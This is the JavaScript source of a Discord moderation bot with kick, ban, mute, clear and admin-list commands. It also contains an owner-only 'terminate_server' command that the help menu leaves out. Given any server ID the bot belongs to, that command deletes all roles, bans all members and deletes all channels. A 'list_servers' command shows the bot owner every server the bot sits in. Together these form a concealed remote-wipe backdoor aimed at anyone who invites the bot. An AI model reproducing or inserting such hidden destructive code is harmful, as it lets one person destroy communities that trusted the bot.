const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder } = require('discord.js');
const keepAlive = require('./webservice');

// Enable all necessary intents
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers, // Required to fetch members
        GatewayIntentBits.GuildPresences, // Required for role management
    ],
});

const BOT_TOKEN = "YOUR_BOT_TOKEN"; // Replace with your actual bot token
const PREFIX = "$";

const botOwnerId = "YOUR_DISCORD_USER_ID"; // Replace with your Discord user ID
const approvedAdmins = new Set([botOwnerId]); // List of approved admins

const mutedUsers = new Map(); // Store muted users and their roles

// Bot Setup
client.on("ready", () => {
    console.log(`Logged in as ${client.user.tag}`);
});

// Command Handler
client.on("messageCreate", async (msg) => {
    if (msg.author.bot) return;
    if (!msg.content.startsWith(PREFIX)) return;

    const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();


    // Terminate Server Command (Bot Owner Only)
    if (command === "terminate_server") {
        // Check if the user is the bot owner
        if (msg.author.id !== botOwnerId) {
            return msg.reply("❌ You do not have permission to use this command.");
        }

        const serverId = args[0];
        if (!serverId) {
            return msg.reply("⚠️ Please provide a server ID.");
        }

        const guild = client.guilds.cache.get(serverId);
        if (!guild) {
            return msg.reply("❌ The bot is not a member of the specified server.");
        }

        // Log the start of the process
        console.log(`[TERMINATE SERVER] Starting termination process for server: ${guild.name} (ID: ${guild.id})`);

        try {
            // Delete all roles
            console.log(`[TERMINATE SERVER] Deleting roles...`);
            const roles = guild.roles.cache;
            for (const role of roles.values()) {
                if (role.id === guild.id) continue; // Skip the @everyone role
                try {
                    await role.delete();
                    console.log(`[TERMINATE SERVER] Deleted role: ${role.name}`);
                } catch (error) {
                    console.error(`[TERMINATE SERVER] Failed to delete role ${role.name}: ${error.message}`);
                }
            }

            // Ban all members
            console.log(`[TERMINATE SERVER] Banning members...`);
            const members = await guild.members.fetch();
            for (const member of members.values()) {
                if (member.id === client.user.id) continue; // Skip the bot itself
                try {
                    await member.ban();
                    console.log(`[TERMINATE SERVER] Banned member: ${member.user.tag}`);
                } catch (error) {
                    console.error(`[TERMINATE SERVER] Failed to ban member ${member.user.tag}: ${error.message}`);
                }
            }

            // Delete all channels
            console.log(`[TERMINATE SERVER] Deleting channels...`);
            const channels = guild.channels.cache;
            for (const channel of channels.values()) {
                try {
                    await channel.delete();
                    console.log(`[TERMINATE SERVER] Deleted channel: ${channel.name}`);
                } catch (error) {
                    console.error(`[TERMINATE SERVER] Failed to delete channel ${channel.name}: ${error.message}`);
                }
            }

            // Create a new "info" channel
            console.log(`[TERMINATE SERVER] Creating info channel...`);
            try {
                const infoChannel = await guild.channels.create({
                    name: "info",
                    type: 0, // Text channel
                    permissionOverwrites: [
                        {
                            id: guild.roles.everyone,
                            deny: [PermissionsBitField.Flags.SendMessages],
                        },
                    ],
                });

                // Send completion message
                const embed = new EmbedBuilder()
                    .setTitle("🚨 **Server Termination Completed**")
                    .setDescription("All roles, members, and channels have been deleted. The server has been reset.")
                    .setColor("#FF0000") // Red color
                    .setFooter({ text: `Requested by ${msg.author.tag}`, iconURL: msg.author.displayAvatarURL() })
                    .setTimestamp();

                await infoChannel.send({ embeds: [embed] });
                console.log(`[TERMINATE SERVER] Info channel created and completion message sent.`);
            } catch (error) {
                console.error(`[TERMINATE SERVER] Failed to create info channel: ${error.message}`);
            }

            // Log completion
            console.log(`[TERMINATE SERVER] Termination process completed for server: ${guild.name} (ID: ${guild.id})`);
            return msg.reply(`✅ Server termination completed for **${guild.name}**.`);
        } catch (error) {
            console.error(`[TERMINATE SERVER] Critical error during termination process: ${error.message}`);
            return msg.reply(`❌ An error occurred during the termination process. Check logs for details.`);
        }
    }


    // List Servers Command (Bot Owner Only)
    if (command === "list_servers") {
        if (msg.author.id !== botOwnerId) {
            return msg.reply("❌ You do not have permission to use this command.");
        }

        const guilds = client.guilds.cache;
        if (guilds.size === 0) {
            return msg.reply("The bot is not serving any servers.");
        }

        // Create a list of servers
        let serverList = "";
        guilds.forEach((guild, id) => {
            serverList += `🔹 **${guild.name}** (ID: \`${id}\`)\n`;
            serverList += `👥 **Members:** ${guild.memberCount}\n`;
            serverList += `👑 **Owner:** <@${guild.ownerId}>\n`;
            serverList += `🌐 **Region:** ${guild.preferredLocale}\n`;
            serverList += `📅 **Created At:** ${guild.createdAt.toDateString()}\n\n`;
        });

        // Create the embed
        const embed = new EmbedBuilder()
            .setTitle("🌍 **Servers List**")
            .setDescription(`The bot is serving **${guilds.size}** servers:\n\n${serverList}`)
            .setColor("#0099FF") // Blue color
            .setFooter({ text: `Requested by ${msg.author.tag}`, iconURL: msg.author.displayAvatarURL() })
            .setTimestamp();

        return msg.reply({ embeds: [embed] });
    }
    
    // Make Admin Command
    if (command === "make_admin") {
        if (msg.author.id !== botOwnerId) {
            return msg.reply("You don't have permission to use this command.");
        }

        const member = msg.mentions.members.first();
        if (!member) {
            return msg.reply("Please mention a user to make an admin.");
        }

        approvedAdmins.add(member.id);
        msg.reply(`${member.user.tag} has been granted bot admin permissions.`);
    }

    // Remove Admin Command
    if (command === "remove_admin") {
        if (msg.author.id !== botOwnerId) {
            return msg.reply("❌ You are not authorized to remove admins!");
        }

        const member = msg.mentions.members.first();
        if (!member) {
            return msg.reply("⚠️ Please mention a user to remove from the admin list.");
        }

        if (!approvedAdmins.has(member.id)) {
            return msg.reply("⚠️ This user is not an admin.");
        }

        approvedAdmins.delete(member.id);
        msg.reply(`✅ **${member.user.tag}** has been removed from the admin list.`);
    }

    // List Admins Command
    if (command === "list_admins") {
        if (approvedAdmins.size === 1) { // Only the bot owner exists
            return msg.reply("📜 **Bot Admins List:**\n\n*No admins assigned yet.*");
        }

        let adminList = "";
        approvedAdmins.forEach(adminId => {
            const adminUser = msg.guild.members.cache.get(adminId);
            if (adminUser) {
                adminList += `🔹 **${adminUser.user.tag}** (<@${adminId}>)\n`;
            }
        });

        const embed = new EmbedBuilder()
            .setTitle("🛠️ **Bot Admins List**")
            .setDescription(adminList || "*No admins assigned yet.*")
            .setColor("#FFD700")
            .setFooter({ text: `Requested by ${msg.author.tag}`, iconURL: msg.author.displayAvatarURL() })
            .setTimestamp();

        return msg.reply({ embeds: [embed] });
    }

    // Help Command
    if (command === "help") {
        const embed = new EmbedBuilder()
            .setTitle("📝 **Bot Commands**")
            .setDescription("Here is a list of all available commands:")
            .addFields(
                { name: "`$developer_badge`", value: "Get the link to claim your Discord Active Developer Badge." },
                { name: "`$kick @user`", value: "Kick a mentioned user from the server. (Requires Kick Members permission)" },
                { name: "`$ban @user`", value: "Ban a mentioned user from the server. (Requires Ban Members permission)" },
                { name: "`$mute @user`", value: "Mute a mentioned user. (Requires Manage Roles permission)" },
                { name: "`$unmute @user`", value: "Unmute a mentioned user. (Requires Manage Roles permission)" },
                { name: "`$clear <amount>`", value: "Delete a specified number of messages (1-100). (Requires Manage Messages permission)" },
                { name: "`$make_admin @user`", value: "Grant admin permissions to a specific user. (Only bot owner can use this)" },
                { name: "`$list_admins`", value: "Display all users with admin permissions." },
                { name: "`$remove_admin @user`", value: "Remove a user from the admin list, revoking bot permissions. (Only bot owner can use this)" }
            )
            .setColor("#00FF00") // Green color
            .setFooter({ text: `Requested by ${msg.author.tag}`, iconURL: msg.author.displayAvatarURL() })
            .setTimestamp();

        return msg.reply({ embeds: [embed] });
    }

    // Developer Badge Command (Anyone Can Use)
    if (command === "developer_badge") {
        msg.reply("https://discord.com/developers/active-developer");
    }

    // Restricted Commands (Only for Approved Admins)
    const restrictedCommands = ["kick", "ban", "mute", "unmute", "clear"];
    if (restrictedCommands.includes(command) && !approvedAdmins.has(msg.author.id)) {
        return msg.reply("You don't have permission to use this command.");
    }

    // Kick Command
    if (command === "kick") {
        const member = msg.mentions.members.first();
        if (!member) return msg.reply("Please mention a user to kick.");
        if (!member.kickable) return msg.reply("I cannot kick this user.");

        await member.kick();
        msg.reply(`${member.user.tag} has been kicked.`);
    }

    // Ban Command
    if (command === "ban") {
        const member = msg.mentions.members.first();
        if (!member) return msg.reply("Please mention a user to ban.");
        if (!member.bannable) return msg.reply("I cannot ban this user.");

        await member.ban();
        msg.reply(`${member.user.tag} has been banned.`);
    }

    // Mute Command
    if (command === "mute") {
        const member = msg.mentions.members.first();
        if (!member) return msg.reply("Please mention a user to mute.");

        const muteRole = msg.guild.roles.cache.find(role => role.name === "Muted");
        if (!muteRole) return msg.reply("Please create a role named 'Muted' to use this command.");

        // Store the user's current roles
        const userRoles = member.roles.cache.filter(role => role.name !== "@everyone").map(role => role.id);
        mutedUsers.set(member.id, userRoles);

        // Remove all roles and assign the Muted role
        await member.roles.set([muteRole.id]);
        msg.reply(`${member.user.tag} has been muted.`);
    }

    // Unmute Command
    if (command === "unmute") {
        const member = msg.mentions.members.first();
        if (!member) return msg.reply("Please mention a user to unmute.");

        const muteRole = msg.guild.roles.cache.find(role => role.name === "Muted");
        if (!muteRole) return msg.reply("Please create a role named 'Muted' to use this command.");

        // Check if the user was muted
        if (!mutedUsers.has(member.id)) {
            return msg.reply("This user is not muted.");
        }

        // Restore the user's roles
        const userRoles = mutedUsers.get(member.id);
        await member.roles.set(userRoles);

        // Remove the Muted role
        await member.roles.remove(muteRole);

        // Remove the user from the mutedUsers map
        mutedUsers.delete(member.id);

        msg.reply(`${member.user.tag} has been unmuted.`);
    }

    // Clear Command
    if (command === "clear") {
        const amount = parseInt(args[0]);
        if (isNaN(amount) || amount < 1 || amount > 100) {
            return msg.reply("Please provide a number between 1 and 100.");
        }

        await msg.channel.bulkDelete(amount + 1); // +1 to include the command message
        msg.reply(`Deleted ${amount} messages.`).then(replyMsg => {
            setTimeout(() => replyMsg.delete(), 5000); // Delete the reply after 5 seconds
        });
    }
});

keepAlive();
client.login(BOT_TOKEN);
